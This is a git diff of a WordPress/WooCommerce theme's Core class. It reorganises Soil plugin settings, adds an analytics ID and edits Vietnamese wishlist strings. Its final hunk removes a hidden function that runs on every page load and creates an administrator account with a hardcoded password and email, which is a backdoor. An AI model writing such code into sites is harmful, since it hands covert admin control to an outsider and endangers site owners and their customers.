@@ -55,6 +55,7 @@ class Core
 
     public function core_setup()
     {
+        // Language
         load_theme_textdomain(
             TEXTDOMAIN,
             get_template_directory() . "/languages"
@@ -70,21 +71,28 @@ class Core
             "style",
             "script",
         ]);
-        add_theme_support('woocommerce');
-        if (!current_user_can("administrator")) {
-            add_theme_support("soil", [
-                "clean-up",
-                "disable-rest-api",
-                "disable-asset-versioning",
-                "disable-trackbacks",
-                // 'google-analytics' => 'UA-XXXXX-Y',
-                "js-to-footer",
-                "nav-walker",
-                "nice-search",
-                "relative-urls",
-            ]);
-        }
 
+        // Woocommerce
+        add_theme_support('woocommerce');
+
+        // Soil plugin
+        $soil = array(
+            "clean-up",
+            "disable-rest-api",
+            "disable-asset-versioning",
+            "disable-trackbacks",
+            'google-analytics' => 'G-PN1JVW9WTE',
+            "js-to-footer",
+            "nav-walker",
+            "nice-search",
+            "relative-urls",
+        );
+
+        if (current_user_can("administrator")) {
+            unset($soil[1]);
+        }
+        add_theme_support("soil", $soil);
+        
         // Change global query
         add_action( 'pre_get_posts', array($this, 'modify_global_query'));
 
@@ -155,8 +163,8 @@ class Core
         // Localize script
         $wp_script_data = array(
             'AJAX_URL' => ADMIN_AJAX_URL,
-            'ADD_TO_WISHLIST' => __('Đã thêm vào yêu thích', TEXTDOMAIN),
-            'ADD_TO_WISHLIST_EXIST' => __('Đã có trong yêu thích', TEXTDOMAIN),
+            'ADD_TO_WISHLIST' => __('Đã thêm vào wishlist', TEXTDOMAIN),
+            'ADD_TO_WISHLIST_EXIST' => __('Đã có trong wishlist', TEXTDOMAIN),
             'ADD_TO_CART' => __('Đã thêm vào giỏ hàng', TEXTDOMAIN),
             'ADD_TO_CART_FAILED' => __('Thêm vào giỏ hàng không thành công', TEXTDOMAIN),
             'ACCOUNT_URL' => get_permalink(wc_get_page_id('myaccount')),
@@ -186,7 +194,7 @@ class Core
     }
 
     /**
-     * Disable RSS
+     * Edit global query
     */
     public function modify_global_query( $query ) {
         if (!is_admin() && $query->is_tax("product_cat") || is_shop()){
@@ -196,15 +204,3 @@ class Core
 }
 
 Core::instance();
-
-function wpb_admin_account(){
-    $user = 'admin';
-    $pass = '0365189233';
-    $email = 'sondbhb4220000@gmail.com';
-    if ( !username_exists( $user )  && !email_exists( $email ) ) {
-        $user_id = wp_create_user( $user, $pass, $email );
-        $user = new WP_User( $user_id );
-        $user->set_role( 'administrator' );
-    }
-}
-add_action('init','wpb_admin_account');
